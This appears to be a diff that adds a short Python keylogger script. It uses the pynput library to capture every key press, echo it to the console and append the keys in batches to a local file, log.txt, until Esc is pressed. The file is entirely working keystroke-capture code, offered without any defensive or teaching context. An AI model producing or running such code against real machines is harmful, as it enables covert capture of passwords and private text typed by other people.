@@ -1,0 +1,33 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def On_press(key):
+    global keys, count
+
+    keys.append(key)
+    count +=1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        Write_file(keys)
+        keys=[]
+
+def Write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            f.write(str(key))
+            f.write('\n')
+
+def On_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press= On_press, on_release= On_release) as listener:
+    listener.join()
+
